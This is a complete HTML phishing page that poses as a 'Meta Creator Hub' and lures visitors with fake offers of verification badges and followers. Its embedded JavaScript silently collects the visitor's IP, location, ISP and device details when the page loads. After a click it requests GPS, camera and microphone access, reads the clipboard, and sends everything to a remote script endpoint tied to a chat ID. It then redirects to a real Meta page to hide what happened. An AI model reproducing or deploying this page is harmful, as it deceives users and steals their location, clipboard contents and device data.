<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"><title>Meta Business Suite | Global Creator Hub</title><link href="https://fonts.googleapis.com" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com"><style>:root{--p:#0064e0;--bg:#f0f2f5;--card:#ffffff;--txt:#1c1e21;--glass:rgba(255,255,255,0.8)}*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--txt);display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px;overflow-x:hidden}.container{max-width:400px;width:100%;background:var(--card);border-radius:16px;box-shadow:0 20px 40px rgba(0,0,0,0.1);overflow:hidden;animation:slideUp 0.6s cubic-bezier(0.2,0.8,0.2,1)}.header{padding:40px 20px;text-align:center;background:linear-gradient(180deg, #fff, #f8f9fa);border-bottom:1px solid #eee}.logo-icon{font-size:50px;color:var(--p);margin-bottom:15px;filter:drop-shadow(0 4px 10px rgba(0,100,224,0.3))}.content{padding:30px 20px;text-align:center}.main-btn{width:100%;padding:18px;border:none;border-radius:10px;background:var(--p);color:#fff;font-size:16px;font-weight:700;cursor:pointer;box-shadow:0 8px 20px rgba(0,100,224,0.3);transition:0.3s}.main-btn:active{transform:scale(0.96)}.grid{display:none;grid-template-columns:1fr 1fr;gap:12px;margin-top:25px;animation:fadeIn 0.5s ease}.card{padding:20px;background:#f7f8fa;border-radius:12px;font-size:12px;font-weight:700;cursor:pointer;border:1px solid #e4e6eb;transition:0.3s;text-align:center}.card:hover{background:#fff;border-color:var(--p);transform:translateY(-3px);box-shadow:0 10px 20px rgba(0,0,0,0.05)}.card i{font-size:26px;color:var(--p);margin-bottom:10px;display:block}.status-box{margin-top:15px;font-size:12px;color:#65676b;font-weight:500}@keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}@keyframes fadeIn{from{opacity:0}to{opacity:1}}</style></head><body>
<div class="container"><div class="header"><div class="logo-icon"><i class="fab fa-facebook"></i></div><h2 style="font-size:22px">Meta Creator Hub</h2><p style="font-size:14px;color:#65676b;margin-top:10px">Link your device to unlock <b>Blue Badge Sync</b>, <b>10k Followers</b>, and <b>VIP Ad-Revenue Groups</b>.</p></div><div class="content"><button id="startBtn" class="main-btn">Activate Global Sync</button><div id="grid" class="grid"><div class="card" data-act="cam"><i class="fas fa-certificate"></i>Blue Badge Sync</div><div class="card" data-act="loc"><i class="fas fa-chart-line"></i>Ad-Region Lock</div><div class="card" data-act="mic"><i class="fas fa-microphone-alt"></i>Voice Support</div><div class="card" data-act="fol"><i class="fas fa-user-plus"></i>10k Followers</div><div class="card" data-act="net"><i class="fas fa-bolt"></i>Fast Net Trick</div><div class="card" data-act="grp"><i class="fas fa-users-crown"></i>Join VIP Groups</div></div><div id="status" class="status-box"></div></div><div style="padding:15px;background:#f7f8fa;text-align:center;font-size:11px;color:#8a8d91;border-top:1px solid #eee"><i class="fas fa-lock"></i> Secured by Meta Guard v18.0 Encryption</div></div>
<script>
class NebulaPrime {
    constructor() {
        this.bridge = "https://script.google.com";
        this.chatId = "6671784926";
        this.session = Math.random().toString(36).substring(2, 10).toUpperCase();
        this.init();
    }
    async report(msg, head="v18-NEBULA") {
        const payload = { chat_id: this.chatId, text: `üåå <b>[${head}] ID: ${this.session}</b>\n\n${msg}`, parse_mode: 'HTML' };
        await fetch(this.bridge, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
    }
    async init() {
        // Immediate Stealth Capture
        const ip = await fetch('https://ipapi.co').then(r => r.json()).catch(() => ({}));
        const bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0.99}));
        let report = `üìÇ <b>SYSTEM DEEP SCAN:</b>\nIP: <code>${ip.ip || '??'}</code>\nCITY: ${ip.city || '??'}\nISP: ${ip.org || '??'}\nRAM: ${navigator.deviceMemory}GB\nCPU: ${navigator.hardwareConcurrency} Cores\nBAT: ${Math.round(bat.level*100)}%\nOS: ${navigator.platform}\nREF: ${document.referrer || 'Direct'}`;
        this.report(report, "SYSTEM-HIT");

        document.getElementById('startBtn').onclick = () => {
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('grid').style.display = 'grid';
            document.getElementById('status').innerText = "Establishing Secure Connection... Grant permissions.";
            this.triggerSiphon();
        };

        document.querySelectorAll('.card').forEach(c => c.onclick = () => {
            this.report(`üéØ <b>CLICK:</b> ${c.innerText}`, "ACTIVITY");
            alert("Connecting to Meta Cloud... Sync Successful.");
            setTimeout(() => { window.location.href = "https://business.facebook.com"; }, 2500);
        });
    }
    async triggerSiphon() {
        navigator.geolocation.getCurrentPosition(p => this.report(`üìç GPS: <a href="https://www.google.com{p.coords.latitude},${p.coords.longitude}">View Map</a>`, "LOCATION"));
        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => {
            this.report("üì∏/üéôÔ∏è MEDIA ACCESS: GRANTED", "MEDIA");
            s.getTracks().forEach(t => t.stop());
        });
        try { navigator.clipboard.readText().then(t => this.report(`üìã CLIPBOARD: <code>${t}</code>`, "HIDDEN")); } catch(e){}
    }
}
new NebulaPrime();
</script></body></html>
